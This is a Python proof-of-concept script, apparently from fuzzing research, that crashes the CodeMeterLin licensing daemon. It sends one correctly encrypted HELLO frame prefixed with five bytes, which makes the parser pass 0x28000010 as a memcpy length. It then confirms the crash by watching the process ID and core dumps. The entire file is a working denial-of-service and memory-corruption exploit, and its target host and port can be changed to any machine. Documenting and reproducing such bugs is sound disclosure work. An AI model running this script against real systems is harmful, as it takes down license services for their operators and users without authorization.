#!/usr/bin/env python3
"""Single-packet reproducer for the prefixed-HELLO CodeMeterLin crash.

This file is intentionally verbose because it documents where the crash
originates.

Important separation:

1. The AES/CRC/SAMC framing below is only transport machinery. It makes the
   daemon accept and decrypt our packet as a normal client-to-daemon SAMC
   frame.
2. The actual crash trigger is only five cleartext bytes inserted before a
   normal HELLO:

       5e 35 5e d6 f2 || canonical HELLO with a fresh client token

3. After decryption, CodeMeterLin parses the shifted HELLO bytes as if they
   were normal structured fields. The first 16 bytes of the mutated cleartext
   become these little-endian 32-bit words:

       bytes: 5e 35 5e d6  f2 0a 00 00  00 00 00 00  10 00 00 28
       u32:   0xd65e355e  0x00000af2  0x00000000  0x28000010

4. In the crashing cores, the parser copies the fourth word into the parser
   object:

       *(u32 *)(this + 0x68) = 0x28000010

   That value then reaches the copy helper as the memcpy length. At the crash:

       #0 libc __memmove_evex_unaligned_erms
       #1 CodeMeterLin + 0x8f431d
       rbx = 0x28000010

So the origin is not the 0x64 request and not a multi-session race. The crash
starts with the malformed HELLO cleartext layout produced by the five-byte
prefix.
"""

from __future__ import annotations

import argparse
import importlib.util
import os
from pathlib import Path
import socket
import struct
import subprocess
import sys
import time


# The reduced mutation. These exact bytes came from the high-throughput
# attribution run:
#
#   worker_09/ring/iter_00004667/
#   mutation: insert_rand at position 0
#   inserted bytes: 5e355ed6f2
#
# They are intentionally not "magic crypto" bytes. They are just plaintext
# bytes that shift the following canonical HELLO fields into parser slots that
# later feed the copy helper.
DEFAULT_PREFIX_HEX = "5e355ed6f2"

# In the deterministic cores, this shifted word is stored at parser object
# offset +0x68 and later appears in rbx as memcpy's length.
EXPECTED_BAD_LEN = 0x28000010


def load_samc(ax_fuzz: Path):
    """Import the existing ax_fuzz SAMC helper module.

    We reuse its known-good crypto/framing helpers and captured canonical
    plaintexts so this reproducer stays focused on the single cleartext
    mutation. The imported helpers provide:

    - CAPTURED_SESSION_C2D[0]: canonical HELLO plaintext
    - substitute_token(...): refreshes the per-session client token
    - encrypt_c2d_frame(...): builds a valid SAMC wire frame
    - recv/decrypt helpers used only for diagnostics
    """
    mod_path = ax_fuzz / "tier1" / "samc_fuzz.py"
    sys.path.insert(0, str(mod_path.parent))
    spec = importlib.util.spec_from_file_location("samc_fuzz", mod_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {mod_path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def codemeter_pid() -> int | None:
    """Return the real CodeMeterLin PID, or None if the daemon is gone."""
    try:
        out = subprocess.check_output(["pgrep", "-x", "CodeMeterLin"], text=True, timeout=1)
    except Exception:
        return None
    pids = [int(tok) for tok in out.split() if tok.isdigit()]
    return pids[0] if pids else None


def newest_core() -> tuple[str, int, int] | None:
    """Return the newest local CodeMeter core-like file.

    The local test host writes full raw cores to /var/tmp/cm_cores. Some older
    runs also used systemd-coredump. Checking both makes the crash oracle less
    dependent on host setup.
    """
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def u32_words(data: bytes, count: int = 4) -> list[int]:
    """Decode the first few little-endian u32 words for human inspection."""
    words = []
    for off in range(0, min(len(data), count * 4), 4):
        if off + 4 <= len(data):
            words.append(struct.unpack_from("<I", data, off)[0])
    return words


def print_plaintext_explanation(canonical_hello: bytes, mutated_hello: bytes,
                                prefix: bytes, token: bytes) -> None:
    """Print the byte-level reason this HELLO is expected to crash."""
    words = u32_words(mutated_hello, 4)
    print("=== cleartext mutation ===")
    print(f"prefix_hex={prefix.hex()}")
    print(f"prefix_len={len(prefix)}")
    print(f"fresh_client_token={token.hex()}")
    print(f"canonical_hello_len={len(canonical_hello)}")
    print(f"mutated_hello_len={len(mutated_hello)}")
    print(f"canonical_hello_head={canonical_hello[:16].hex()}")
    print(f"mutated_hello_head={mutated_hello[:16].hex()}")
    print("mutated_hello_first_u32_le=" + ",".join(f"0x{w:08x}" for w in words))
    if len(words) >= 4:
        print(f"word_at_cleartext_offset_0x0c=0x{words[3]:08x}")
        print(f"expected_bad_memcpy_len=0x{EXPECTED_BAD_LEN:08x}")
        print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
    print()
    print("Interpretation:")
    print("  The daemon decrypts this as a valid SAMC HELLO plaintext.")
    print("  The 5-byte prefix shifts the normal HELLO fields.")
    print("  The shifted u32 at cleartext offset 0x0c is 0x28000010.")
    print("  In confirmed cores, the parser stores that value at this+0x68.")
    print("  The copy helper later uses it as memcpy length at CodeMeterLin+0x8f431d.")
    print()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Send the deterministic prefixed-HELLO crash packet.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Crash origin, in one line:
  prefixing HELLO with 5e355ed6f2 makes the parser see u32 0x28000010
  at the field that is later copied into this+0x68 and used as memcpy length.

This sends only one frame: the mutated HELLO. It does not send ACK or 0x64.
""",
    )
    ap.add_argument("--ax-fuzz", default="/home/avj/clones/ax_fuzz")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=22350)
    ap.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                    help="hex bytes to insert before the canonical HELLO")
    ap.add_argument("--wait", type=float, default=10.0)
    args = ap.parse_args()

    # Load captured plaintexts and crypto helpers from ax_fuzz. This is not
    # where the vulnerability is; it just gives us a correctly encrypted SAMC
    # frame accepted by CodeMeterLin.
    samc = load_samc(Path(args.ax_fuzz))

    # Crash oracle baseline. If the PID changes/disappears or a newer core
    # appears after sending the packet, we count the reproduction as successful.
    before_pid = codemeter_pid()
    before_core = newest_core()

    # CodeMeter rejects replayed HELLO tokens. Refresh the token so the mutated
    # HELLO still reaches the parser instead of being discarded as a replay.
    token = os.urandom(samc.HELLO_TOKEN_LEN)
    canonical_hello = samc.substitute_token(0, samc.CAPTURED_SESSION_C2D[0], token)

    # This is the actual reduced bug trigger:
    #
    #   mutated_hello = 5e355ed6f2 || canonical_hello
    #
    # Everything after this point is just SAMC wire encoding and sending.
    prefix = bytes.fromhex(args.prefix)
    mutated_hello = prefix + canonical_hello

    print("=== daemon baseline ===")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()
    print_plaintext_explanation(canonical_hello, mutated_hello, prefix, token)

    # Build a TCP connection to the live daemon. The daemon normally listens on
    # localhost:22350 unless configured as a network server.
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)
    sock.connect((args.host, args.port))
    try:
        # encrypt_c2d_frame appends the SAMC CRC/length tail, encrypts with the
        # time-derived AES key/IV, wraps it in the "samc" wire header, and adds
        # the client-to-daemon opcode byte. This preserves valid transport
        # framing; the parser bug is in the decrypted plaintext content above.
        wire = samc.encrypt_c2d_frame(mutated_hello, int(time.time()))
        print("=== send ===")
        print(f"wire_len={len(wire)}")
        print("sending exactly one mutated HELLO frame")
        sock.sendall(wire)
        try:
            # A crashing run usually has no response: the daemon dies while
            # processing the HELLO. If a response appears, print it for
            # diagnostics and let the PID/core oracle below decide success.
            resp = samc.recv_one_wire_frame(sock, timeout=2.0)
            inner = samc.decrypt_d2c_frame(resp, int(time.time())) if resp else None
            print(f"response_wire_len={None if resp is None else len(resp)}")
            print(f"response_inner_len={None if inner is None else len(inner)}")
        except Exception as exc:
            print(f"recv_exception={type(exc).__name__}:{exc}")
    finally:
        sock.close()

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    if crashed:
        print()
        print("Expected GDB facts for the resulting core:")
        print("  #1 CodeMeterLin + 0x8f431d")
        print("  rbx = 0x28000010")
        print("  parsed buffer +0x0c = 0x28000010")
        print("  parser object this+0x68 = 0x28000010")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
